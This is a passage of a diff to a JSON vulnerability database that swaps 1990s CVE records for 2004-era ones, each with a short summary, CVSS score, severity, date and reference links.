+        "http://archives.neohapsis.com/archives/iss/2004-q1/0157.html",
         "http://marc.info/?l=bugtraq&m=107530966524193&w=2",
-        "http://www.securityfocus.com/bid/9513",
-        "http://marc.info/?l=bugtraq&m=107530966524193&w=2",
-        "http://www.securityfocus.com/bid/9513"
+        "http://secunia.com/advisories/10739",
+        "http://www.osvdb.org/3740",
+        "http://www.securityfocus.com/bid/9514"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-2128",
-      "summary": "Cross-site scripting (XSS) vulnerability in BRS WebWeaver 1.07 allows remote attackers to execute arbitrary script as other users via the query string to ISAPISkeleton.dll.",
-      "cvssScore": 6.8,
+      "id": "CVE-2004-0042",
+      "summary": "vsftpd 1.1.3 generates different error messages depending on whether or not a valid username exists, which allows remote attackers to identify valid usernames.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2004-12-31",
+      "published": "2004-02-03",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=107531020924977&w=2",
-        "http://secunia.com/advisories/10741",
-        "http://www.brswebweaver.com/modules.php?op=modload&name=News&file=article&sid=1",
-        "http://www.osvdb.org/3741",
-        "http://www.securityfocus.com/bid/9516"
+        "http://securitytracker.com/id?1008628",
+        "http://securitytracker.com/id?1008628"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0134",
-      "summary": "vold in Solaris 2.x allows local users to gain root access.",
-      "cvssScore": 7.2,
+      "id": "CVE-2004-0043",
+      "summary": "Buffer overflow in Yahoo Instant Messenger 5.6.0.1351 and earlier allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a long filename in the download feature.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "1996-08-06",
+      "published": "2004-02-03",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.osvdb.org/8159",
-        "http://www.osvdb.org/8159"
+        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-January/015334.html",
+        "http://marc.info/?l=bugtraq&m=107357996802255&w=2",
+        "http://secunia.com/advisories/10573",
+        "http://www.osvdb.org/3437",
+        "http://www.securityfocus.com/bid/9383"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1309",
-      "summary": "Sendmail before 8.6.7 allows local users to gain root access via a large value in the debug (-d) command line option.",
-      "cvssScore": 7.2,
+      "id": "CVE-2004-0044",
+      "summary": "Cisco Personal Assistant 1.4(1) and 1.4(2) disables password authentication when \"Allow Only Cisco CallManager Users\" is enabled and the Corporate Directory settings refer to the directory service being used by Cisco CallManager, which allows remote attackers to gain access with a valid username.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "1996-08-30",
+      "published": "2004-02-03",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.cert.org/advisories/CA-94.12.sendmail.vulnerabilities",
-        "http://www.dataguard.no/bugtraq/1994_1/0040.html",
-        "http://www.dataguard.no/bugtraq/1994_1/0042.html",
-        "http://www.dataguard.no/bugtraq/1994_1/0043.html",
-        "http://www.dataguard.no/bugtraq/1994_1/0048.html"
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040108-pa.shtml",
+        "http://www.osvdb.org/3430",
+        "http://www.securityfocus.com/bid/9384",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/14172",
+        "http://www.cisco.com/warp/public/707/cisco-sa-20040108-pa.shtml"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0324",
-      "summary": "ppl program in HP-UX allows local users to create root files through symlinks.",
-      "cvssScore": 7.2,
+      "id": "CVE-2004-0045",
+      "summary": "Buffer overflow in the ARTpost function in art.c in the control message handling code for INN 2.4.0 may allow remote attackers to execute arbitrary code.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "1996-09-01",
+      "published": "2004-02-03",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9702-053",
-        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9702-053"
+        "http://archives.neohapsis.com/archives/bugtraq/2004-01/0063.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2004-01/0064.html",
+        "http://secunia.com/advisories/10578",
+        "http://www.kb.cert.org/vuls/id/759020",
+        "http://www.securityfocus.com/bid/9382"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1252",
-      "summary": "Vulnerability in a certain system call in SCO UnixWare 2.0.x and 2.1.0 allows local users to access arbitrary files and gain root privileges.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1996-09-04",
+      "id": "CVE-2004-0046",
+      "summary": "Cross-site scripting (XSS) vulnerability in SnapStream PVS LITE allows remote attackers to inject arbitrary web script or HTML via a GET request containing a terminating '\"' (double quote) character.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2004-02-03",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://ftp.sco.COM/SSE/security_bulletins/SB.96:02a",
-        "http://www.cert.org/vendor_bulletins/VB-96.15.sco",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1966",
-        "ftp://ftp.sco.COM/SSE/security_bulletins/SB.96:02a",
-        "http://www.cert.org/vendor_bulletins/VB-96.15.sco"
+        "http://marc.info/?l=bugtraq&m=107350313917867&w=2",
+        "http://secunia.com/advisories/10575",
+        "http://securitytracker.com/id?1008646",
+        "http://www.osvdb.org/3440",
+        "http://www.securityfocus.com/bid/9375"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0131",
-      "summary": "Buffer overflow and denial of service in Sendmail 8.7.5 and earlier through GECOS field gives root access to local users.",
-      "cvssScore": 7.2,
+      "id": "CVE-2004-1082",
+      "summary": "mod_digest_apple for Apache 1.3.31 and 1.3.32 on Mac OS X Server does not properly verify the nonce of a client response, which allows remote attackers to replay credentials.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "1996-09-11",
+      "published": "2004-02-03",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/717",
-        "http://www.securityfocus.com/bid/717"
+        "http://lists.apple.com/archives/security-announce/2004/Dec/msg00000.html",
+        "http://www.ciac.org/ciac/bulletins/p-049.shtml",
+        "http://www.securityfocus.com/bid/9571",
+        "http://www.securitytracker.com/alerts/2004/Dec/1012414.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/18347"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0319",
-      "summary": "Buffer overflow in xmcd 2.1 allows local users to gain access through a user resource setting.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1996-10-01",
+      "id": "CVE-2004-2085",
+      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in Brad Fears phpCodeCabinet 0.4 and earlier allow remote attackers to inject arbitrary web script or HTML via multiple parameters, including (1) the sid parameter to comments.php, (2) the cid, cf, or rfd parameters to category.php, or the cid parameter to (3) input.php, (4) browse.php, (5) themes/facade/header.php, or (6) themes/phpcc/header.php.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2004-02-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0319",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0319"
+        "http://cvs.sourceforge.net/viewcvs.py/phpcodecabinet/phpcc/browse.php?r1=1.5&r2=1.6",
+        "http://cvs.sourceforge.net/viewcvs.py/phpcodecabinet/phpcc/category.php?r1=1.4&r2=1.5",
+        "http://cvs.sourceforge.net/viewcvs.py/phpcodecabinet/phpcc/comments.php?r1=1.1&r2=1.2",
+        "http://cvs.sourceforge.net/viewcvs.py/phpcodecabinet/phpcc/input.php?r1=1.7&r2=1.8",
+        "http://cvs.sourceforge.net/viewcvs.py/phpcodecabinet/phpcc/themes/facade/header.php?r1=1.4&r2=1.5"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0032",
-      "summary": "Buffer overflow in lpr, as used in BSD-based systems including Linux, allows local users to execute arbitrary code as root via a long -C (classification) command line option.",
+      "id": "CVE-2004-2073",
+      "summary": "Linux-VServer 1.24 allows local users with root privileges on a virtual server to gain access to the filesystem outside the virtual server via a modified chroot-again exploit using the chmod command.",
       "cvssScore": 7.2,
       "severity": "High",
-      "published": "1996-10-25",
+      "published": "2004-02-06",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://patches.sgi.com/support/free/security/advisories/19980402-01-PX",
-        "http://www.ciac.org/ciac/bulletins/i-042.shtml",
-        "http://www.securityfocus.com/bid/707",
-        "ftp://patches.sgi.com/support/free/security/advisories/19980402-01-PX",
-        "http://www.ciac.org/ciac/bulletins/i-042.shtml"
+        "http://secunia.com/advisories/10816",
+        "http://www.linux-vserver.org/index.php?page=ChangeLog",
+        "http://www.osvdb.org/3875",
+        "http://www.securityfocus.com/archive/1/353003",
+        "http://www.securityfocus.com/bid/9596"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0277",
-      "summary": "The WorkMan program can be used to overwrite any file to get root access.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1996-10-28",
+      "id": "CVE-2004-2086",
+      "summary": "Stack-based buffer overflow in results.stm for Sambar Server before the 6.0 production release allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via an HTTP POST request with a long query parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-02-06",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0277",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0277"
+        "http://securitytracker.com/id?1008979",
+        "http://www.osvdb.org/5786",
+        "http://www.sambar.com/security.htm",
+        "http://www.securityfocus.com/archive/82/353087",
+        "http://www.securityfocus.com/bid/9607"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1384",
-      "summary": "Indigo Magic System Tour in the SGI system tour package (systour) for IRIX 5.x through 6.3 allows local users to gain root privileges via a Trojan horse .exitops program, which is called by the inst command that is executed by the RemoveSystemTour program.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1996-10-30",
+      "id": "CVE-2004-2089",
+      "summary": "Matrix FTP Server allows remote attackers to cause a denial of service (crash) by logging in using four spaces as the username and password and then issuing a LIST command.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-02-06",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://ftp.auscert.org.au/pub/auscert/advisory/AA-96.08.SGI.systour.vul",
-        "ftp://patches.sgi.com/support/free/security/advisories/19961101-01-I",
-        "http://marc.info/?l=bugtraq&m=87602167420095&w=2",
-        "http://www.iss.net/security_center/static/7456.php",
-        "http://www.securityfocus.com/bid/470"
+        "http://securitytracker.com/id?1008970",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15075",
+        "http://securitytracker.com/id?1008970",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15075"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0311",
-      "summary": "fpkg2swpk in HP-UX allows local users to gain root access.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1996-11-01",
+      "id": "CVE-2004-2084",
+      "summary": "Cross-site scripting (XSS) vulnerability in search.php in JShop E-Commerce Server allows remote attackers to inject arbitrary web script or HTML via the xSearch parameter.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2004-02-07",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9612-042",
-        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9612-042"
+        "http://secunia.com/advisories/10825",
+        "http://securitytracker.com/id?1008988",
+        "http://www.osvdb.org/3889",
+        "http://www.securityfocus.com/bid/9609",
+        "http://www.systemsecure.org/advisories/ssadvisory09022004.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0336",
-      "summary": "Buffer overflow in mstm in HP-UX allows local users to gain root access.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1996-11-01",
+      "id": "CVE-2004-2090",
+      "summary": "Microsoft Internet Explorer 5.0.1 through 6.0 allows remote attackers to determine the existence of arbitrary files via the VBScript LoadPicture method, which returns an error code if the file does not exist.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-02-07",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0336",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0336"
+        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-February/016881.html",
+        "http://secunia.com/advisories/10820",
+        "http://www.securityfocus.com/bid/9611",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15078",
+        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-February/016881.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1161",
-      "summary": "Vulnerability in ppl in HP-UX 10.x and earlier allows local users to gain root privileges by forcing ppl to core dump.",
-      "cvssScore": 7.2,
+      "id": "CVE-2004-1244",
+      "summary": "Windows Media Player 9 allows remote attackers to execute arbitrary code via a PNG file containing large (1) width or (2) height values, aka the \"PNG Processing Vulnerability.\"",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "1996-11-03",
+      "published": "2004-02-08",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://ciac.llnl.gov/ciac/bulletins/h-32.shtml",
-        "http://marc.info/?l=bugtraq&m=87602167420102&w=2",
-        "http://marc.info/?l=bugtraq&m=87602167420103&w=2",
-        "http://www.codetalker.com/advisories/vendor/hp/hpsbux9704-057.html",
-        "http://www.iss.net/security_center/static/7438.php"
+        "http://www.kb.cert.org/vuls/id/259890",
+        "http://www.us-cert.gov/cas/techalerts/TA05-039A.html",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2005/ms05-009",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/19096",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A1306"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0461",
+      "summary": "The DHCP daemon (DHCPD) for ISC DHCP 3.0.1rc12 and 3.0.1rc13, when compiled in environments that do not provide the vsnprintf function, uses C include files that define vsnprintf to use the less safe vsprintf function, which can lead to buffer overflow vulnerabilities that enable a denial of service (server crash) and possibly execute arbitrary code.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2004-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108795911203342&w=2",
+        "http://marc.info/?l=bugtraq&m=108843959502356&w=2",
+        "http://marc.info/?l=bugtraq&m=108938625206063&w=2",
+        "http://secunia.com/advisories/23265",
+        "http://www.kb.cert.org/vuls/id/654390"
       ],
       "vulnerableProducts": [],
       "isExploited": false
